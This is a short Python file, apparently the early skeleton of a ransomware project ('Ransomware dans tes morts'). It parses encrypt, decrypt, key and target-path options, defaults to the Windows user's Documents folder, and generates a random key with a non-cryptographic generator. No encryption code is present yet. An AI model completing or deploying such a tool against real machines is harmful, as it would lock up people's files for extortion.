import argparse
import platform,os
from pathlib import Path
import string,random

sys = platform.system()
actual_user = os.getlogin()

if sys == "Windows" : default_path=r"C:\\Users\\"+actual_user+r"\\Documents" #Pour configuration Windows
elif sys == "TODO" : pass

parser = argparse.ArgumentParser(description="Ransomware dans tes morts",formatter_class=argparse.ArgumentDefaultsHelpFormatter)

parser.add_argument("-e","-encrypt","--encrypt", action="store_true",help="Encryption Mode", default=None)
parser.add_argument("-d","-decrypt","--decrypt", action="store_true",help="Decryption Mode",default =None )
parser.add_argument("-k","-key", "--key", help="Encryption / Decryption Key")
parser.add_argument("--path","-path","-p", help="Répertoire Cible, par défaut sur windows ",default=default_path)
parser.add_argument("--demo","-demo",action="store_true" ,help="Mode de démonstration",default=default_path)
parser.add_argument("--keyLength","-keyLength",help="Si clé de chifrement non précisé, précise la taille de la clé à générer",default=25)
parser.add_argument("-v","-verbose","--verbose",action="store_true",help="Active l'affichage des actions en temps réel", default = False)

args = parser.parse_args()
config = vars(args)

def genRandomKey(length=25):
    """
    Fonction qui génère aléatoirement une clé de chiffrement 
    longueur length

    Args:
        length (int, optional): Nombre de caractère dans la clé de chiffrement. Defaults to 25.

    Returns:
        string : clé de chiffrement
    """
    car = string.ascii_letters + "0123456789"
    key = ''.join(random.choice(car) for i in range(length))
    return key

print(genRandomKey())

#print(car)
#print(config['path'])
#print(actual_user)
#print(type(sys))
#print(config)
# Return {'encrypt': True, 'decrypt': None, 'key': 'Bonjour', 'path': 'C:\\Test\\'}